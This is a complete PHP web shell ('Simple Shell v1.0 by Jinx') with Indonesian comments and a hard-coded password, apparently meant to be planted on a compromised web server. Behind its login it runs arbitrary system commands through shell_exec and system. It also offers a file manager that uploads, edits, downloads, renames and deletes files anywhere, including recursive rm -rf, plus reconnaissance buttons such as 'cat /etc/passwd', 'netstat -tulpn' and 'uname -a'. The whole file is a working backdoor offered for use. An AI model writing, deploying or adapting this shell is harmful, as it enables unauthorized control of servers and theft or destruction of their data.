<?php
/*
 * SIMPLE SHELL v1.0 - BY JINX
 * NO BLOAT, JUST POWER
 */

session_start();
error_reporting(0);

// ============================================
// 🔐 CONFIG - GANTI PASSWORD DI SINI!
// ============================================
$PASSWORD = 'ikanbandeng'; // 🔥 GANTI PASSWORD INI!

// ============================================
// 🔐 LOGIN SYSTEM
// ============================================
if(!isset($_SESSION['logged_in'])) {
    if(isset($_POST['pass'])) {
        if($_POST['pass'] === $PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
        } else {
            $error = "Wrong password!";
        }
    }
    
    // SHOW LOGIN PAGE
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>🔐 Login</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                background: #0a0a0a;
                font-family: "Courier New", monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #00ff00;
            }
            .login-box {
                background: #111;
                padding: 40px;
                border-radius: 10px;
                border: 2px solid #00ff00;
                width: 350px;
                text-align: center;
                box-shadow: 0 0 20px #00ff00;
            }
            h1 {
                margin-bottom: 30px;
                color: #00ff00;
                text-shadow: 0 0 10px #00ff00;
            }
            input[type="password"] {
                width: 100%;
                padding: 12px;
                margin: 15px 0;
                background: #000;
                border: 1px solid #00ff00;
                color: #00ff00;
                border-radius: 5px;
                font-size: 16px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 12px;
                background: #ff0000;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: 0.3s;
            }
            input[type="submit"]:hover {
                background: #cc0000;
            }
            .error {
                color: #ff0000;
                margin: 10px 0;
                text-shadow: 0 0 5px #ff0000;
            }
            .footer {
                margin-top: 20px;
                color: #666;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 SHELL ACCESS</h1>
            '. (isset($error) ? '<div class="error">'.$error.'</div>' : '') .'
            <form method="post">
                <input type="password" name="pass" placeholder="Enter password" required autofocus>
                <input type="submit" value="ENTER">
            </form>
            <div class="footer">
                Simple Shell v1.0 | ' . date('Y-m-d') . '
            </div>
        </div>
    </body>
    </html>';
    exit;
}

// ============================================
// 🛠️ UTILITY FUNCTIONS
// ============================================
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
@chdir($current_dir);

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes/1073741824,2).' GB';
    if ($bytes >= 1048576) return number_format($bytes/1048576,2).' MB';
    if ($bytes >= 1024) return number_format($bytes/1024,2).' KB';
    return $bytes.' bytes';
}

function getBreadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumb = '<a href="?dir=/">/</a>';
    $current = '';
    foreach($parts as $part) {
        if(empty($part)) continue;
        $current .= '/' . $part;
        $breadcrumb .= ' / <a href="?dir='.urlencode($current).'">'.htmlspecialchars($part).'</a>';
    }
    return $breadcrumb;
}

// ============================================
// 🎨 HTML OUTPUT
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>🔥 SIMPLE SHELL</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: "Courier New", monospace;
            padding: 20px;
            line-height: 1.6;
        }
        .header {
            background: #111;
            padding: 20px;
            border-left: 5px solid #ff0000;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .menu {
            background: #111;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            border: 1px solid #333;
        }
        .menu a {
            color: #00ffff;
            text-decoration: none;
            padding: 8px 15px;
            background: #222;
            border-radius: 3px;
            border: 1px solid #333;
            transition: 0.3s;
        }
        .menu a:hover {
            background: #333;
            border-color: #00ffff;
        }
        .logout {
            background: #300 !important;
            color: #ff0000 !important;
            border-color: #500 !important;
        }
        .container {
            background: #111;
            padding: 20px;
            border-radius: 5px;
            margin: 10px 0;
            border: 1px solid #333;
        }
        .file-table {
            width: 100%;
            background: #000;
            border-collapse: collapse;
            margin: 10px 0;
            border: 1px solid #333;
        }
        .file-table th {
            background: #222;
            padding: 12px;
            border: 1px solid #333;
            text-align: left;
            color: #00ff00;
        }
        .file-table td {
            padding: 10px;
            border: 1px solid #333;
        }
        .file-table tr:hover {
            background: #1a1a1a;
        }
        .dir { color: #00ffff; }
        .file { color: #00ff00; }
        .action {
            color: #ffff00;
            text-decoration: none;
            margin: 0 3px;
            padding: 3px 6px;
            background: #222;
            border-radius: 3px;
            border: 1px solid #444;
            font-size: 12px;
        }
        .action:hover {
            background: #333;
        }
        input, textarea, select {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            margin: 5px 0;
            width: 100%;
            border-radius: 3px;
        }
        button, .btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            display: inline-block;
            text-decoration: none;
        }
        button:hover, .btn:hover {
            background: #cc0000;
        }
        .terminal-output {
            background: #000;
            color: #00ff00;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            min-height: 100px;
            max-height: 400px;
            overflow-y: auto;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .breadcrumb {
            background: #000;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 3px;
            margin: 10px 0;
        }
        .breadcrumb a {
            color: #00ffff;
        }
        .footer {
            text-align: center;
            color: #666;
            margin-top: 30px;
            padding-top: 10px;
            border-top: 1px solid #333;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>🔥 SIMPLE SHELL v1.0</h1>
    <p>📁 <strong>Current:</strong> <?php echo htmlspecialchars($current_dir); ?></p>
    <p>👤 <strong>User:</strong> <?php echo @shell_exec('whoami'); ?> | 🖥️ <strong>Server:</strong> <?php echo gethostname(); ?></p>
</div>

<div class="menu">
    <a href="?">🏠 HOME</a>
    <a href="?action=files">📁 FILES</a>
    <a href="?action=terminal">💻 TERMINAL</a>
    <a href="?action=upload">📤 UPLOAD</a>
    <a href="?action=newfile">📄 NEW FILE</a>
    <a href="?action=newfolder">📁 NEW FOLDER</a>
    <a href="?logout" class="logout">🚪 LOGOUT</a>
</div>

<?php
// ============================================
// 📁 FILE MANAGER
// ============================================
if(!isset($_GET['action']) || $_GET['action'] == 'files') {
    echo '<div class="container">
        <h2>📁 FILE MANAGER</h2>
        <div class="breadcrumb">' . getBreadcrumb($current_dir) . '</div>';
    
    // Handle file actions
    if(isset($_GET['delete'])) {
        $file = $_GET['delete'];
        if(is_dir($file)) {
            @system('rm -rf ' . escapeshellarg($file));
        } else {
            @unlink($file);
        }
        echo '<p style="color:#00ff00;">✅ Deleted: ' . htmlspecialchars(basename($file)) . '</p>';
        echo '<script>setTimeout(() => window.location.href="?dir=' . urlencode($current_dir) . '", 1000);</script>';
    }
    
    if(isset($_GET['download'])) {
        $file = $_GET['download'];
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        @readfile($file);
        exit;
    }
    
    // List files
    $files = @scandir($current_dir);
    if(!$files) {
        echo '<p style="color:#ff0000;">❌ Cannot read directory</p>';
    } else {
        echo '<table class="file-table">
            <tr>
                <th>Type</th>
                <th>Name</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>';
        
        // Parent directory
        if($current_dir != '/' && $current_dir != '') {
            $parent = dirname($current_dir);
            echo '<tr>
                <td class="dir">📁</td>
                <td><a href="?dir=' . urlencode($parent) . '">..</a></td>
                <td>DIR</td>
                <td>-</td>
                <td><a href="?dir=' . urlencode($parent) . '" class="action">OPEN</a></td>
            </tr>';
        }
        
        foreach($files as $file) {
            if($file == '.' || $file == '..') continue;
            
            $fullpath = $current_dir . '/' . $file;
            $is_dir = @is_dir($fullpath);
            
            echo '<tr>
                <td class="' . ($is_dir ? 'dir' : 'file') . '">' . ($is_dir ? '📁' : '📄') . '</td>
                <td>';
            
            if($is_dir) {
                echo '<a href="?dir=' . urlencode($fullpath) . '">' . htmlspecialchars($file) . '</a>';
            } else {
                echo htmlspecialchars($file);
            }
            
            $size = $is_dir ? 'DIR' : formatSize(@filesize($fullpath));
            $modified = @filemtime($fullpath) ? date('Y-m-d H:i', @filemtime($fullpath)) : '-';
            
            echo '</td>
                <td>' . $size . '</td>
                <td>' . $modified . '</td>
                <td>';
            
            if($is_dir) {
                echo '<a href="?dir=' . urlencode($fullpath) . '" class="action">OPEN</a>
                      <a href="?action=rename&file=' . urlencode($fullpath) . '" class="action">RENAME</a>
                      <a href="?delete=' . urlencode($fullpath) . '" onclick="return confirm(\'Delete folder?\')" class="action">DELETE</a>';
            } else {
                echo '<a href="?action=view&file=' . urlencode($fullpath) . '" class="action">VIEW</a>
                      <a href="?action=edit&file=' . urlencode($fullpath) . '" class="action">EDIT</a>
                      <a href="?action=rename&file=' . urlencode($fullpath) . '" class="action">RENAME</a>
                      <a href="?download=' . urlencode($fullpath) . '" class="action">DOWNLOAD</a>
                      <a href="?delete=' . urlencode($fullpath) . '" onclick="return confirm(\'Delete file?\')" class="action">DELETE</a>';
            }
            
            echo '</td></tr>';
        }
        
        echo '</table>';
    }
    
    echo '</div>';
}

// ============================================
// 💻 TERMINAL
// ============================================
elseif($_GET['action'] == 'terminal') {
    echo '<div class="container">
        <h2>💻 TERMINAL</h2>
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter command (ls, pwd, whoami, etc)" value="' . htmlspecialchars($_POST['cmd'] ?? '') . '">
            <button type="submit">🚀 EXECUTE</button>
        </form>';
    
    if(isset($_POST['cmd'])) {
        echo '<div style="margin-top:20px;">
            <h3>📋 Output:</h3>
            <div class="terminal-output">';
        
        $cmd = $_POST['cmd'];
        if(function_exists('shell_exec')) {
            $output = @shell_exec($cmd . ' 2>&1');
        } elseif(function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } else {
            $output = '❌ Command execution disabled';
        }
        
        echo htmlspecialchars($output ?: '(No output)');
        echo '</div></div>';
    }
    
    echo '<div style="margin-top:20px;">
        <h3>⚡ Quick Commands:</h3>
        <div style="display:flex;flex-wrap:wrap;gap:5px;margin-top:10px;">';
    
    $quick_cmds = [
        'pwd' => 'Current directory',
        'ls -la' => 'List files',
        'whoami' => 'Current user',
        'id' => 'User info',
        'uname -a' => 'System info',
        'df -h' => 'Disk space',
        'free -m' => 'Memory',
        'ps aux' => 'Processes',
        'netstat -tulpn' => 'Network',
        'w' => 'Logged users',
        'cat /etc/passwd' => 'Users list',
        'ifconfig || ip a' => 'Network config',
    ];
    
    foreach($quick_cmds as $cmd => $desc) {
        echo '<button onclick="document.querySelector(\'input[name=cmd]\').value=\'' . $cmd . '\'; document.querySelector(\'form\').submit();" title="' . $desc . '">' . $cmd . '</button>';
    }
    
    echo '</div></div></div>';
}

// ============================================
// 📤 UPLOAD FILE
// ============================================
elseif($_GET['action'] == 'upload') {
    echo '<div class="container">
        <h2>📤 UPLOAD FILE</h2>
        <form method="post" enctype="multipart/form-data">
            <p><strong>Select file:</strong></p>
            <input type="file" name="file" required>
            
            <p><strong>Upload to:</strong></p>
            <input type="text" name="upload_dir" value="' . htmlspecialchars($current_dir) . '">
            
            <button type="submit" name="upload">🚀 UPLOAD</button>
        </form>';
    
    if(isset($_POST['upload']) && isset($_FILES['file'])) {
        $upload_dir = $_POST['upload_dir'] ?: $current_dir;
        $target = rtrim($upload_dir, '/') . '/' . basename($_FILES['file']['name']);
        
        if(@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo '<div style="background:#002200;padding:15px;margin:15px 0;border:1px solid #00ff00;border-radius:5px;">
                <h3 style="color:#00ff00;">✅ UPLOAD SUCCESS!</h3>
                <p><strong>File:</strong> ' . htmlspecialchars(basename($target)) . '</p>
                <p><strong>Size:</strong> ' . formatSize($_FILES['file']['size']) . '</p>
                <p><strong>Location:</strong> ' . htmlspecialchars($target) . '</p>
                <p><a href="?dir=' . urlencode(dirname($target)) . '">📁 Open directory</a></p>
            </div>';
        } else {
            echo '<p style="color:#ff0000;">❌ Upload failed! Check permissions.</p>';
        }
    }
    
    echo '</div>';
}

// ============================================
// 📄 NEW FILE
// ============================================
elseif($_GET['action'] == 'newfile') {
    echo '<div class="container">
        <h2>📄 CREATE NEW FILE</h2>
        <form method="post">
            <p><strong>Filename:</strong></p>
            <input type="text" name="filename" placeholder="newfile.php" required>
            
            <p><strong>Directory:</strong></p>
            <input type="text" name="filedir" value="' . htmlspecialchars($current_dir) . '">
            
            <p><strong>Content:</strong></p>
            <textarea name="content" rows="10" placeholder="File content..."></textarea>
            
            <button type="submit" name="createfile">💾 CREATE FILE</button>
        </form>';
    
    if(isset($_POST['createfile'])) {
        $filename = $_POST['filename'];
        $filedir = $_POST['filedir'] ?: $current_dir;
        $content = $_POST['content'] ?: '';
        
        $filepath = rtrim($filedir, '/') . '/' . $filename;
        
        if(@file_put_contents($filepath, $content)) {
            echo '<div style="background:#002200;padding:15px;margin:15px 0;border:1px solid #00ff00;border-radius:5px;">
                <h3 style="color:#00ff00;">✅ FILE CREATED!</h3>
                <p><strong>Location:</strong> ' . htmlspecialchars($filepath) . '</p>
                <p><strong>Size:</strong> ' . formatSize(strlen($content)) . '</p>
                <p><a href="?action=edit&file=' . urlencode($filepath) . '">✏️ Edit file</a> | 
                   <a href="?dir=' . urlencode(dirname($filepath)) . '">📁 Open directory</a></p>
            </div>';
        } else {
            echo '<p style="color:#ff0000;">❌ Failed to create file! Check permissions.</p>';
        }
    }
    
    echo '</div>';
}

// ============================================
// 📁 NEW FOLDER
// ============================================
elseif($_GET['action'] == 'newfolder') {
    echo '<div class="container">
        <h2>📁 CREATE NEW FOLDER</h2>
        <form method="post">
            <p><strong>Folder name:</strong></p>
            <input type="text" name="foldername" placeholder="newfolder" required>
            
            <p><strong>Directory:</strong></p>
            <input type="text" name="folderdir" value="' . htmlspecialchars($current_dir) . '">
            
            <button type="submit" name="createfolder">📁 CREATE FOLDER</button>
        </form>';
    
    if(isset($_POST['createfolder'])) {
        $foldername = $_POST['foldername'];
        $folderdir = $_POST['folderdir'] ?: $current_dir;
        
        $folderpath = rtrim($folderdir, '/') . '/' . $foldername;
        
        if(@mkdir($folderpath, 0755, true)) {
            echo '<div style="background:#002200;padding:15px;margin:15px 0;border:1px solid #00ff00;border-radius:5px;">
                <h3 style="color:#00ff00;">✅ FOLDER CREATED!</h3>
                <p><strong>Location:</strong> ' . htmlspecialchars($folderpath) . '</p>
                <p><a href="?dir=' . urlencode($folderpath) . '">📁 Open folder</a></p>
            </div>';
        } else {
            echo '<p style="color:#ff0000;">❌ Failed to create folder! Check permissions.</p>';
        }
    }
    
    echo '</div>';
}

// ============================================
// 👁️ VIEW FILE
// ============================================
elseif(isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $content = @file_get_contents($file);
    
    echo '<div class="container">
        <h2>👁️ VIEW FILE: ' . htmlspecialchars(basename($file)) . '</h2>
        <p><strong>Path:</strong> ' . htmlspecialchars($file) . ' | <strong>Size:</strong> ' . formatSize(@filesize($file)) . '</p>
        <div class="terminal-output" style="max-height:500px;">' . htmlspecialchars($content ?: '(Empty file)') . '</div>
        <div style="margin-top:15px;">
            <a href="?action=edit&file=' . urlencode($file) . '" class="btn">✏️ EDIT</a>
            <a href="?download=' . urlencode($file) . '" class="btn">⬇️ DOWNLOAD</a>
            <a href="?dir=' . urlencode(dirname($file)) . '" class="btn">📁 BACK</a>
        </div>
    </div>';
}

// ============================================
// ✏️ EDIT FILE
// ============================================
elseif(isset($_GET['action']) && $_GET['action'] == 'edit' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $content = @file_get_contents($file);
    
    echo '<div class="container">
        <h2>✏️ EDIT FILE: ' . htmlspecialchars(basename($file)) . '</h2>
        <form method="post">
            <input type="hidden" name="editfile" value="' . htmlspecialchars($file) . '">
            <textarea name="content" rows="20">' . htmlspecialchars($content ?: '') . '</textarea>
            <div style="margin-top:15px;">
                <button type="submit" name="save">💾 SAVE</button>
                <a href="?action=view&file=' . urlencode($file) . '" class="btn">👁️ VIEW</a>
                <a href="?dir=' . urlencode(dirname($file)) . '" class="btn">📁 BACK</a>
            </div>
        </form>
    </div>';
    
    if(isset($_POST['save']) && $_POST['editfile'] == $file) {
        if(@file_put_contents($file, $_POST['content'])) {
            echo '<div style="background:#002200;padding:10px;margin:10px 0;border:1px solid #00ff00;border-radius:5px;">
                <p style="color:#00ff00;">✅ File saved successfully!</p>
            </div>';
        } else {
            echo '<p style="color:#ff0000;">❌ Failed to save file!</p>';
        }
    }
}

// ============================================
// 📝 RENAME FILE/FOLDER
// ============================================
elseif(isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['file'])) {
    $file = $_GET['file'];
    
    echo '<div class="container">
        <h2>📝 RENAME: ' . htmlspecialchars(basename($file)) . '</h2>
        <form method="post">
            <input type="hidden" name="oldname" value="' . htmlspecialchars($file) . '">
            <p><strong>New name:</strong></p>
            <input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" required>
            <div style="margin-top:15px;">
                <button type="submit" name="rename">📝 RENAME</button>
                <a href="?dir=' . urlencode(dirname($file)) . '" class="btn">📁 BACK</a>
            </div>
        </form>
    </div>';
    
    if(isset($_POST['rename']) && $_POST['oldname'] == $file) {
        $newpath = dirname($file) . '/' . $_POST['newname'];
        if(@rename($file, $newpath)) {
            echo '<div style="background:#002200;padding:10px;margin:10px 0;border:1px solid #00ff00;border-radius:5px;">
                <p style="color:#00ff00;">✅ Renamed to: ' . htmlspecialchars($_POST['newname']) . '</p>
            </div>';
            echo '<script>setTimeout(() => window.location.href="?dir=' . urlencode(dirname($file)) . '", 1000);</script>';
        } else {
            echo '<p style="color:#ff0000;">❌ Failed to rename!</p>';
        }
    }
}

// ============================================
// 🚪 LOGOUT
// ============================================
if(isset($_GET['logout'])) {
    session_destroy();
    echo '<script>window.location.href = "?";</script>';
    exit;
}

// ============================================
// 🏁 FOOTER
// ============================================
echo '<div class="footer">
    <p>🔥 SIMPLE SHELL v1.0 | No Bloat, Just Power</p>
    <p>📡 ' . $_SERVER['REMOTE_ADDR'] . ' | 🕒 ' . date('Y-m-d H:i:s') . ' | ⏱️ ' . round((time() - $_SESSION['login_time']) / 60, 1) . ' minutes</p>
</div>

</body>
</html>';
?>